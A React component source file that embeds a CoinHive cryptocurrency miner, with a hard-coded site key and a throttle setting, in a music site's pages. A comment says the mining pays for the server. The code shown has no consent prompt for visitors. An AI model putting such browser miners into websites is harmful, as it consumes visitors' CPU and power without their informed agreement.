import React, { Component } from 'react'
import CoinHive from 'react-coin-hive'

const SECOND = 1000
const MINUTE = 60 * SECOND

// DISCLAIMER:
// This miner is used to pay the server.
// No personal profit here.

class SoundNuggetsCoinHive extends Component {
  constructor (props, context) {
    super(props, context)

    this.state = {
      throttle: 0.9
    }

    this.timer = null
  }

  onStart () {
    console.log('Miner activated')
/*
    this.timer = setInterval(() => {
      console.log(this.state.throttle);
      if (this.state.throttle === 0.8) {
        return this.setState({throttle: 0.1});
      }
      this.setState({throttle: this.state.throttle + 0.1});
    }, 10 * MINUTE);
*/
  }

  onStop () {
    console.log('Miner stopped')
//    clearInterval(this.timer)
//    this.setState({throttle: 0.1})
  }

  render () {
    return <CoinHive siteKey='ZdA9clPbISwnvt6HViJLH53NXY9HdHY2'
      threads={1}
      userName={this.props.username || 'Anonymous'}
      throttle={this.state.throttle}
      onStart={this.onStart.bind(this)}
      onStop={this.onStop.bind(this)}
      timeout={10000}
      />
  }
}

export default SoundNuggetsCoinHive
